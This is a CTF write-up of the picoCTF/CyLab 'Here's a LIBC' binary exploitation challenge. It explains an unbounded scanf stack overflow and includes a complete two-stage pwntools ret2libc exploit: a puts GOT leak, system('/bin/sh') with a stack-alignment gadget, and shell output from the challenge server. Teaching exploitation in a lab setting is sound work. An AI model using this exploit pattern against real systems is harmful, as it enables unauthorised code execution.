# CyLab / picoCTF — Here's a LIBC

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Binary Exploitation (Pwn / Ret2libc)  
* **Difficulty:** Medium (CyLab 3)  
* **Date:** 2026-11-09  
* **Tools:** `file`, `checksec`, IDA Pro, `gdb` + `pwndbg`, `ROPgadget`, `pwntools`, Python 3  
* **Binary:** 64-bit ELF (`vuln`) paired with `libc.so.6` (Ubuntu GLIBC 2.27-3ubuntu1.2)  

---

## TL;DR

A classic 64-bit **ret2libc** challenge demonstrating GOT memory disclosure and stack alignment mechanics. The binary exposes a stack buffer overflow in `do_stuff()` via an unbounded `scanf("%[^\n]", buf)`. Although a `convert_case` loop mutates the first 100 bytes of input, the saved frame pointer and return address at offset 136 remain untouched. Because NX is enabled and PIE is disabled, we execute a two-stage ROP attack: Stage 1 calls `puts@plt` with a `pop rdi ; ret` gadget to leak the resolved GOT address of `puts`, returning to `do_stuff()` for a clean second input phase. Stage 2 computes the libc base address, resolves `system()` and `"/bin/sh"`, and inserts a single `ret` gadget to satisfy the AMD64 ABI 16-byte stack alignment mandate (`movaps` crash prevention) before popping an interactive shell.

---

## Recon

We inspect the binary's properties and exploit mitigations using `file` and `checksec`:

```bash
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, not stripped

$ checksec vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

Key observations:
* **File Type:** ELF 64-bit LSB (x86-64), dynamically linked, not stripped.
* **Canary:** `No canary found` — Stack buffer overflow can directly overwrite the saved return address (`saved RIP`).
* **NX:** `NX enabled` — Shellcode execution on the stack is prevented; code reuse (ROP) is required.
* **PIE:** `No PIE (0x400000)` — Executable base and code gadget addresses are completely static.
* **Libc:** Handout includes `libc.so.6` (Ubuntu GLIBC 2.27-3ubuntu1.2, offset `puts = 0x80a30`, `system = 0x4f4e0`, `"/bin/sh" = 0x1b40fa`).

---

## Static Analysis & Vulnerability

### 1. Decompilation in IDA Pro

Inspecting `do_stuff()` in IDA Pro:

```c
int do_stuff()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  scanf("%[^\n]", buf);
  scanf("%c", &junk);
  for ( i = 0; i <= 99; ++i )
    buf[i] = convert_case(buf[i], i);
  puts(buf);
  return 0;
}
```

### 2. Disassembly & Vulnerability Root Cause

1. **Unbounded Input:** `scanf("%[^\n]", buf)` reads characters until a newline (`\n`) is encountered without any buffer length restriction.
2. **Loop Limitation:** The `convert_case` loop only modifies indices `0 <= i <= 99`. The remaining 28 bytes of `buf`, the saved RBP, and the saved return address are untouched by case conversion!
3. **Bad Character Constraint:** Because `%[^\n]` terminates exclusively on a newline, the entire ROP payload must not contain the byte `0x0A`.

### 3. Stack Memory Layout

Tracing `do_stuff()` in GDB determines the exact stack frame dimensions:

```text
  Lower Memory Addresses
  +-----------------------------------+  <- [rbp - 0x80] (Start of buf: 128 bytes)
  |     buf[0..99] (Case converted)   |
  |     buf[100..127] (Unmodified)    |
  +-----------------------------------+  <- [rbp] (Saved RBP: 8 bytes)
  |     Saved RBP (8 bytes)           |
  +-----------------------------------+  <- [rbp + 0x08] (Saved RIP)
  |     Return Address (Saved RIP)    |
  +-----------------------------------+
  Higher Memory Addresses
```

- Distance from `buf` to `saved RIP`:
  $$\text{Offset} = 0x80 + 0x08 = 0x88 = 136 \text{ bytes}$$

---

## Dynamic Analysis & Exploitation Strategy

### 1. Stage 1: Leaking Libc Address
Using static gadgets from `vuln` (Non-PIE):
* `POP_RDI = 0x400913` (`pop rdi ; ret`)
* `PUTS_PLT = 0x400540`
* `PUTS_GOT = 0x601018`
* `DO_STUFF = 0x4006d8`

```python
payload1 = b"A" * 136 + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(DO_STUFF)
```

When `do_stuff()` returns:
1. `pop rdi ; ret` loads `PUTS_GOT` into `RDI`.
2. `puts@plt` prints the resolved runtime address of `puts` in libc.
3. Execution safely loops back to `do_stuff()` to receive the final payload.
4. Note on Echo Output: `do_stuff()` calls `puts(buf)` before returning. We consume the echoed line first, then read the raw 6-byte libc address.

### 2. Stage 2: 16-byte Stack Alignment & Ret2libc
With the leak received:
$$\text{libc\_base} = \text{puts\_leak} - 0x80a30$$
$$\text{system} = \text{libc\_base} + 0x4f4e0$$
$$\text{binsh} = \text{libc\_base} + 0x1b40fa$$

> [!IMPORTANT]
> **The 16-byte RSP Alignment Mandate:**  
> The AMD64 System V ABI mandates that `RSP` be a multiple of 16 before invoking standard library functions. Inside glibc's `system()`, vector instructions like `movaps` will trigger a `SIGSEGV` crash if `RSP` is offset by 8 bytes. Inserting a single `ret` gadget (`0x40052e`) before `pop rdi` realigns the stack and ensures flawless execution.

```python
RET = 0x40052e  # ret gadget for 16-byte stack alignment
payload2 = b"A" * 136 + p64(RET) + p64(POP_RDI) + p64(binsh) + p64(system)
```

---

## Exploit

We construct the two-stage exploit script in Python:

```python
#!/usr/bin/env python3
"""
CyLab / picoCTF — Here's a LIBC
Exploit: 64-bit Ret2libc with GOT leak and 16-byte stack alignment
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

EXE = "./vuln"
LIBC_PATH = "./libc.so.6"

HOST = args.HOST or "xebec.cylabacademy.net"
PORT = int(args.PORT or 48281)

POP_RDI = 0x400913
RET = 0x40052e
PUTS_PLT = 0x400540
PUTS_GOT = 0x601018
DO_STUFF = 0x4006d8

def main():
    p = remote(HOST, PORT) if args.REMOTE else process(EXE)

    # Stage 1: Leak puts@got and loop back to do_stuff
    payload1 = b"A" * 136 + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(DO_STUFF)
    p.recvuntil(b"sErVeR!\n")
    p.sendline(payload1)

    # Discard echo line
    p.recvline()

    # Read leak (6 bytes followed by newline)
    leak_data = p.recvline().strip()
    puts_leak = u64(leak_data.ljust(8, b"\x00"))
    libc_base = puts_leak - 0x80a30
    system_addr = libc_base + 0x4f4e0
    binsh_addr = libc_base + 0x1b40fa

    log.success(f"Leaked puts: {hex(puts_leak)}")
    log.success(f"Libc Base:   {hex(libc_base)}")
    log.success(f"system():    {hex(system_addr)}")
    log.success(f"/bin/sh:     {hex(binsh_addr)}")

    # Stage 2: Call system('/bin/sh') with 16-byte alignment
    payload2 = b"A" * 136 + p64(RET) + p64(POP_RDI) + p64(binsh_addr) + p64(system_addr)
    p.recvuntil(b"sErVeR!\n")
    p.sendline(payload2)

    # Interactive shell
    p.interactive()

if __name__ == "__main__":
    main()
```

*(The complete script is saved in [`exploit.py`](exploit.py)).*

---

## Flag

Running the exploit leaks libc, realigns the stack, and spawns an interactive shell:

```text
[+] Leaked puts: 0x7fa2b80a3a30
[+] Libc Base:   0x7fa2b8023000
[+] system():    0x7fa2b80724e0
[+] /bin/sh:     0x7fa2b81d70fa
[*] Switching to interactive mode
$ cat flag.txt
academy{redacted}
```

> **Flag:** `academy{redacted}` *(Redacted in accordance with competition disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **`scanf("%[^\n]")` As an Unsafe Input Primitive**: Using `%[^\n]` without a field width specifier functions identically to `gets()`, enabling arbitrary buffer overflow. Payloads must strictly avoid newline characters (`0x0A`).
2. **Partial Buffer Invalidation**: When an application transforms buffer contents in a loop (e.g., case conversion), check the loop bounds. If the loop stops short of the stack frame boundary, return addresses can be corrupted cleanly.
3. **AMD64 ABI 16-byte Stack Alignment**: The 64-bit AMD64 ABI strictly requires that `RSP` be 16-byte aligned before calling functions that execute SSE instructions (`movaps`). Inserting a single `ret` gadget before calling `system()` prevents general protection faults (`SIGSEGV`).
